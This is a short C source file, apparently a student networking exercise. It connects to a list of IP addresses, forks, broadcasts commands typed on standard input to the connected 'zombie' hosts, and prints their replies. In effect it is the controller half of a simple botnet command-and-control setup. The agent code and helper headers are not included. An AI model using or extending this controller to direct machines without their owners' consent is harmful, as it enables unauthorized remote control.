#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <poll.h>

#include "utils_v2.h"
#include "network.h"

void sendCommandToZombies()
{
    while (1)
    {
        char command[256];
        int charRead = sread(0, command, 256);
        command[charRead - 1] = '\0';
        for (size_t i = 0; i < nbrSockFD; i++)
        {
            swrite(sockFdPortsConnectedTab[i], command, sizeof(command));
        }
    }
}

char *listenToResponse()
{
    struct pollfd fds[nbrSockFD];
    char buffer[2000];

    for (int i = 0; i < nbrSockFD; i++)
    {
        // init poll

        fds[i].fd = sockFdPortsConnectedTab[i];
        fds[i].events = POLLIN;
    }

    while (1)
    {
        spoll(fds, nbrSockFD, 0);

        for (int i = 0; i < nbrSockFD; i++)
        {
            if (fds[i].revents & POLLIN)
            {
                int nbChar = sread(fds[i].fd, buffer, 2000);

                swrite(1, buffer, nbChar);
            }
        }
    }
}

int main(int argc, char const *argv[])
{
    nbrSockFD = 0;
    for (size_t i = 1; i < argc; i++)
    {
        const char* ip = argv[i];
        testAndConnectPorts(ip);
    }

    pid_t pid;

    pid = fork();
    if (pid == 0)
    {
        // FILS
        sendCommandToZombies();
    }
    else
    {
        // PERE
        listenToResponse();
    }

    free(sockFdPortsConnectedTab);
    return 0;
}
